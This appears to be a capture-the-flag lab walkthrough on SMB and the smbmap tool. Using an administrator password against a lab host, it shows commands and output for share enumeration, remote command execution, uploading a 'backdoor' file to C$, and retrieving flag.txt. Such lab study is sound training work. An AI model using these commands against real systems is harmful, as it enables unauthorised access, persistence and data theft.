# SMB

SMB (Server Message Block) is a protocol used for sharing files, printers, and other resources between devices on a network. It is commonly used in Windows operating systems and allows for easy file sharing between computers. The default port for SMB is 445, but it can also use port 139. However, due to security concerns, it's recommended to use SMB over VPN or with encryption enabled to prevent unauthorized access to shared resources.

## smbmap

smbmap is a command-line tool used for enumerating and interacting with SMB shares on Windows and Linux systems. It allows users to quickly scan for open SMB shares, list the available files and directories, and even execute commands on the remote system.

Here is how we can use smbmap on a network:

```sh
root@attackdefense:~# smbmap -u administrator -p "smbserver_771" -d . -H 10.5.20.115
[+] IP: 10.5.20.115:445	Name: 10.5.20.115                                       
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	READ, WRITE	Remote Admin
	C                                                 	READ ONLY	
	C$                                                	READ, WRITE	Default share
	D$                                                	READ, WRITE	Default share
	Documents                                         	READ ONLY	
	Downloads                                         	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	print$                                            	READ, WRITE	Printer Drivers
```

We can also do command execution using this command:

```sh
root@attackdefense:~# smbmap -u administrator -p "smbserver_771" -H 10.5.20.115 -x "ipconfig"
                                
Windows IP Configuration


Ethernet adapter Ethernet 3:

   Connection-specific DNS Suffix  . : ap-south-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::447d:2419:7782:5b26%22
   IPv4 Address. . . . . . . . . . . : 10.5.20.115
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Default Gateway . . . . . . . . . : 10.5.16.1

Tunnel adapter isatap.ap-south-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : ap-south-1.compute.internal
```

`-L` - List all drives on the specified host, requires ADMIN rights. Example:

```sh
root@attackdefense:~# smbmap -u administrator -p "smbserver_771" -H 10.5.20.115 -L           
[+] Host 10.5.20.115 Local Drives: C:\ D:\
[+] Host 10.5.20.115 Net Drive(s):
	No mapped network drives
```

In this case, no mapped network drives were found.

We can connect a drive, such as C drive, by using the following command:

```sh
root@attackdefense:~# smbmap -u administrator -p "smbserver_771" -H 10.5.20.115 -r 'C$'
[+] IP: 10.5.20.115:445	Name: 10.5.20.115                                       
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	C$                                                	READ, WRITE	
	.\C$\*
	dr--r--r--                0 Sat Sep  5 13:26:00 2020	$Recycle.Bin
	fw--w--w--           398356 Wed Aug 12 10:47:41 2020	bootmgr
	fr--r--r--                1 Wed Aug 12 10:47:40 2020	BOOTNXT
	dr--r--r--                0 Wed Aug 12 10:47:41 2020	Documents and Settings
	fr--r--r--               32 Mon Dec 21 21:27:10 2020	flag.txt
	fr--r--r--       8589934592 Wed Dec 27 20:31:32 2023	pagefile.sys
	dr--r--r--                0 Wed Aug 12 10:49:32 2020	PerfLogs
	dw--w--w--                0 Wed Aug 12 10:49:32 2020	Program Files
	dr--r--r--                0 Sat Sep  5 14:35:45 2020	Program Files (x86)
	dr--r--r--                0 Sat Sep  5 14:35:45 2020	ProgramData
	dr--r--r--                0 Sat Sep  5 09:16:57 2020	System Volume Information
	dw--w--w--                0 Sat Dec 19 11:14:55 2020	Users
	dr--r--r--                0 Wed Dec 27 20:53:23 2023	Windows
```

We can also upload a backdoor from our system to the target system:

```sh
root@attackdefense:~# smbmap -u administrator -p "smbserver_771" -H 10.5.20.115 --upload '/root/backdoor' 'C$\backdoor'
[+] Starting upload: /root/backdoor (0 bytes)
[+] Upload complete
```

We can read the file like this:

```sh
root@attackdefense:~# smbmap -u administrator -p "smbserver_771" -H 10.5.20.115 -r 'C$' -x 'type flag.txt'
```

We can also download the file like this:

```sh
root@attackdefense:~# smbmap -u administrator -p "smbserver_771" -H 10.5.20.115 --download 'C$\flag.txt'      
[+] Starting download: C$\flag.txt (32 bytes)
[+] File output to: /root/10.5.20.115-C_flag.txt
```
